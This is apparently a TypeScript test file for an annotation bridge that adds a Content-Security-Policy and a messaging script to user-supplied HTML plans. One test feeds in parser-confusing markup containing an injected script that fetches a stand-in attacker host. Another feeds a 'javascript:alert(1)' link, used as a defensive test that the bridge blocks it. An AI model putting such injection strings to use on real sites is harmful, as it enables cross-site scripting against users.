import { expect, test } from "bun:test";
import { runInNewContext } from "node:vm";
import { withAnnotationBridge } from "./annotation-bridge";

const SCRIPT_BODY = /<script>([\s\S]*?)<\/script>/;

test("the template handoff receives only a validated public plan ID", () => {
  const id = "h_12345678901234567890";
  expect(withAnnotationBridge("<p>Plan</p>", true, "", false, id)).toContain(
    id
  );
  const secretLink = `https://bitplan.dev/d/${id}#k=reader-secret`;
  expect(
    withAnnotationBridge("<p>Plan</p>", true, "", false, secretLink)
  ).not.toContain("reader-secret");
});

function bridgeScript(html: string): string {
  const script = SCRIPT_BODY.exec(html)?.[1];
  if (!script) {
    throw new Error("Expected an injected bridge script.");
  }
  return script;
}

test("the collaboration bridge preserves standards mode and runs behind CSP", () => {
  const html = withAnnotationBridge(
    '<!doctype html><html><head><title>Plan</title></head><body><p id="note">Hello</p></body></html>'
  );
  expect(html.startsWith("<!doctype html>")).toBe(true);
  expect(html.indexOf("Content-Security-Policy")).toBeLessThan(
    html.indexOf("<script>")
  );
  expect(html).toContain('<p id="note">Hello</p>');
  expect(() => new Function(bridgeScript(html))).not.toThrow();
});

test("parser-confusing plan markup cannot precede the policy or bridge", () => {
  for (const html of [
    '<!-- <head> --><script>fetch("https://attacker.test")</script>',
    '<head data-x=">"><script>fetch("https://attacker.test")</script>',
  ]) {
    const secured = withAnnotationBridge(html);
    expect(secured.indexOf("Content-Security-Policy")).toBeLessThan(
      secured.indexOf("bitplan-geometry-ready/1")
    );
    expect(secured.indexOf("bitplan-geometry-ready/1")).toBeLessThan(
      secured.indexOf("https://attacker.test")
    );
  }
});

test("click anchors round-trip over a private port, including blank space", async () => {
  const handlers = new Map<string, (event: unknown) => void>();
  const messages: { type: string; payload: any }[] = [];
  let rect = {
    bottom: 180,
    height: 80,
    left: 40,
    right: 440,
    top: 100,
    width: 400,
  };
  class Element {
    id = "section";
    textContent = "A paragraph";
    closest(selector: string) {
      return selector === "a[href]" ? null : this;
    }
    getBoundingClientRect() {
      return rect;
    }
  }
  const element = new Element();
  let scans = 0;
  let candidates = [element];
  const trustedEvents = new WeakSet<object>();
  class TestEvent {
    constructor() {
      // Chromium exposes this unforgeable getter on each event, not its prototype.
      Object.defineProperty(this, "isTrusted", {
        get() {
          return trustedEvents.has(this);
        },
      });
    }
  }
  const trustedEvent = <T extends object>(value: T) => {
    const event = Object.assign(new TestEvent(), value);
    trustedEvents.add(event);
    return event;
  };
  let parentPort: MessagePort | undefined;
  const parent = {
    postMessage(
      message: { type?: string },
      _targetOrigin: string,
      ports: MessagePort[]
    ) {
      expect(message.type).toBe("bitplan-geometry-ready/1");
      [parentPort] = ports;
    },
  };
  const context = {
    document: {
      addEventListener: (name: string, callback: (event: unknown) => void) =>
        handlers.set(name, callback),
      documentElement: {
        scrollHeight: 2000,
        scrollWidth: 800,
        style: { cursor: "" },
      },
      elementFromPoint: () => element,
      querySelectorAll: () => {
        scans += 1;
        return candidates;
      },
    },
    Element,
    Event: TestEvent,
    EventTarget,
    innerHeight: 600,
    innerWidth: 800,
    MessageChannel,
    MessageEvent,
    MessagePort,
    parent,
    performance: { now: () => 1000 },
    requestAnimationFrame: (callback: () => void) => callback(),
    scrollX: 0,
    scrollY: 0,
    window: {
      addEventListener: (name: string, callback: (event: unknown) => void) =>
        handlers.set(`window:${name}`, callback),
      getSelection: () => ({ toString: () => "Selected paragraph" }),
    },
  };
  const script = bridgeScript(withAnnotationBridge("<head></head>"));
  runInNewContext(script, context);
  expect(parentPort).toBeDefined();
  const port = parentPort as MessagePort;
  port.addEventListener("message", (event) => messages.push(event.data));
  port.start();
  let syntheticContextPrevented = false;
  for (const [name, event] of [
    ["click", { button: 0, clientX: 1, clientY: 1, target: element }],
    ["auxclick", { button: 0, clientX: 1, clientY: 1, target: element }],
    ["pointermove", { clientX: 1, clientY: 1, target: element }],
    [
      "contextmenu",
      {
        clientX: 1,
        clientY: 1,
        preventDefault() {
          syntheticContextPrevented = true;
        },
        target: element,
      },
    ],
    [
      "keydown",
      {
        key: "F10",
        preventDefault() {
          // The synthetic event records no browser default behavior.
        },
        shiftKey: true,
      },
    ],
  ] as const) {
    handlers.get(name)?.(event);
  }
  await flushMessages();
  expect(messages).toEqual([]);
  expect(syntheticContextPrevented).toBe(false);
  port.postMessage({ payload: true, type: "pick" });
  await flushMessages();
  expect(context.document.documentElement.style.cursor).toContain("crosshair");
  handlers.get("keydown")?.(trustedEvent({ key: "Escape" }));
  await flushMessages();
  expect(context.document.documentElement.style.cursor).toBe("");
  expect(messages.at(-1)).toEqual({ payload: "Escape", type: "shortcut" });
  handlers.get("keydown")?.(
    trustedEvent({
      key: "t",
      preventDefault() {
        /* Test event. */
      },
    })
  );
  await flushMessages();
  expect(messages.at(-1)).toEqual({ payload: "t", type: "shortcut" });
  const beforeModifiedShortcut = messages.length;
  handlers.get("keydown")?.(trustedEvent({ ctrlKey: true, key: "t" }));
  await flushMessages();
  expect(messages.length).toBe(beforeModifiedShortcut);
  handlers.get("click")?.(
    trustedEvent({ clientX: 140, clientY: 120, target: element })
  );
  await flushMessages();
  const anchor = messages.at(-1)?.payload.anchor;
  expect(messages.at(-1)?.type).toBe("click");
  expect(anchor.point).toEqual({ x: 0.25, y: 0.25 });
  const locate = async (value: unknown) => {
    port.postMessage({
      payload: [{ anchor: value, id: "note" }],
      type: "anchors",
    });
    await flushMessages();
    await flushMessages();
  };
  await locate(anchor);
  expect(messages.at(-1)?.payload[0].position).toMatchObject({
    bounds: { height: 80, width: 400, x: 40, y: 100 },
    x: 140,
    y: 120,
  });
  rect = {
    bottom: 120,
    height: 160,
    left: 20,
    right: 220,
    top: -40,
    width: 200,
  };
  await locate(anchor);
  expect(messages.at(-1)?.payload[0].position).toMatchObject({ x: 70, y: 0 });
  handlers.get("click")?.(
    trustedEvent({ clientX: 10, clientY: 60, target: null })
  );
  await flushMessages();
  const blank = messages.at(-1)?.payload.anchor;
  context.scrollY = 50;
  await locate(blank);
  expect(messages.at(-1)?.payload[0].position).toEqual({ x: 10, y: 10 });
  const before = messages.length;
  handlers.get("contextmenu")?.(
    trustedEvent({
      clientX: 70,
      clientY: 0,
      preventDefault() {
        // The bridge intentionally suppresses the native context menu.
      },
      target: element,
    })
  );
  await flushMessages();
  expect(messages.slice(before).map((message) => message.type)).toEqual([
    "click",
    "context",
  ]);
  expect(messages.at(-1)?.payload.selection).toBe("Selected paragraph");
  const beforePassthrough = messages.length;
  let passthroughPrevented = false;
  handlers.get("contextmenu")?.(
    trustedEvent({
      clientX: 70,
      clientY: 0,
      preventDefault() {
        passthroughPrevented = true;
      },
      shiftKey: true,
      target: element,
    })
  );
  await flushMessages();
  expect(passthroughPrevented).toBe(true);
  expect(
    messages.slice(beforePassthrough).map((message) => message.type)
  ).toEqual(["click", "context"]);
  const afterContext = messages.length;
  handlers.get("auxclick")?.(
    trustedEvent({
      button: 2,
      clientX: 70,
      clientY: 0,
      target: element,
    })
  );
  expect(messages.length).toBe(afterContext);
  port.postMessage({
    payload: { x: 70, y: 0 },
    type: "point",
  });
  await flushMessages();
  await flushMessages();
  expect(messages.at(-1)?.payload.anchor.point).toEqual({ x: 0.25, y: 0.25 });
  expect(messages.at(-1)?.type).toBe("context");
  port.postMessage({ payload: true, type: "pick" });
  await flushMessages();
  expect(context.document.documentElement.style.cursor).toContain("crosshair");
  handlers.get("pointermove")?.(
    trustedEvent({ clientX: 70, clientY: 0, target: element })
  );
  await flushMessages();
  expect(messages.at(-1)?.payload.selecting).toBe(true);
  handlers.get("click")?.(
    trustedEvent({
      button: 0,
      clientX: 70,
      clientY: 0,
      preventDefault() {
        /* Native cancellation stub. */
      },
      stopImmediatePropagation() {
        /* Native propagation stub. */
      },
      target: element,
    })
  );
  await flushMessages();
  expect(messages.at(-1)?.type).toBe("picked");
  expect(messages.at(-1)?.payload.anchor.elementId).toBe("section");
  expect(context.document.documentElement.style.cursor).toBe("");
  handlers.get("keydown")?.(
    trustedEvent({ key: "Shift", repeat: false, target: null })
  );
  await flushMessages();
  expect(messages.at(-1)?.type).toBe("context");
  expect(messages.at(-1)?.payload.x).toBe(70);
  scans = 0;
  port.postMessage({
    payload: Array.from({ length: 400 }, (_, i) => ({
      anchor:
        i % 2
          ? { elementId: "section", point: { x: 0.5, y: 0.5 } }
          : { point: { x: 0.5, y: 0.5 }, quote: { exact: "A paragraph" } },
      id: `bulk-${i}`,
    })),
    type: "anchors",
  });
  await flushMessages();
  await flushMessages();
  expect(scans).toBe(2);
  expect(messages.at(-1)?.payload).toHaveLength(400);
  expect(
    messages.at(-1)?.payload.every((row: any) => row.position !== null)
  ).toBe(true);
  // Indexes live for one frame only: duplicates and changed text must invalidate resolution.
  candidates = [element, new Element()];
  await locate(anchor);
  expect(messages.at(-1)?.payload[0].position).toBeNull();
  await locate({ point: { x: 0.5, y: 0.5 }, quote: { exact: "A paragraph" } });
  expect(messages.at(-1)?.payload[0].position).toBeNull();
  candidates = [element];
  element.textContent = "Changed paragraph";
  await locate({ point: { x: 0.5, y: 0.5 }, quote: { exact: "A paragraph" } });
  expect(messages.at(-1)?.payload[0].position).toBeNull();
  port.close();
});

function flushMessages(): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, 0));
}

test("reader-only plans open safe links natively and retain local anchors", () => {
  const handlers = new Map<string, (event: any) => void>();
  let scrolled = "";
  let focused = false;
  let top = false;
  class Element {
    attributes: Record<string, string> = { href: "https://example.com/docs" };
    closest() {
      return this;
    }
    getAttribute(name: string) {
      return this.attributes[name];
    }
    setAttribute(name: string, value: string) {
      this.attributes[name] = value;
    }
  }
  const context = {
    document: {
      addEventListener: (name: string, callback: (event: any) => void) =>
        handlers.set(name, callback),
      baseURI: "https://bitplan.dev/d/test",
      getElementById: (id: string) =>
        id === "section one"
          ? {
              focus() {
                focused = true;
              },
              hasAttribute() {
                return false;
              },
              scrollIntoView() {
                scrolled = id;
              },
              setAttribute() {
                // The assertion only needs the method to exist.
              },
            }
          : null,
    },
    Element,
    URL,
    window: {
      scrollTo() {
        top = true;
      },
    },
  };
  const script = bridgeScript(withAnnotationBridge("<head></head>", false));
  runInNewContext(script, context);
  const link = new Element();
  let prevented = false;
  const click = () =>
    handlers.get("click")?.({
      preventDefault() {
        prevented = true;
      },
      target: link,
    });
  click();
  expect(link.attributes.target).toBe("_blank");
  expect(link.attributes.rel).toBe("noopener noreferrer");
  expect(prevented).toBe(false);
  link.attributes.href = "#section%20one";
  click();
  expect(prevented).toBe(true);
  expect(scrolled).toBe("section one");
  expect(focused).toBe(true);
  for (const href of ["#missing", "#bad%", "#"]) {
    prevented = false;
    link.attributes.href = href;
    click();
    expect(prevented).toBe(true);
  }
  expect(top).toBe(true);
  prevented = false;
  link.attributes.href = "/docs";
  click();
  expect(link.attributes.target).toBe("_blank");
  expect(prevented).toBe(false);
  link.attributes.href = "javascript:alert(1)";
  click();
  expect(prevented).toBe(true);
  expect(handlers.has("contextmenu")).toBe(false);
});
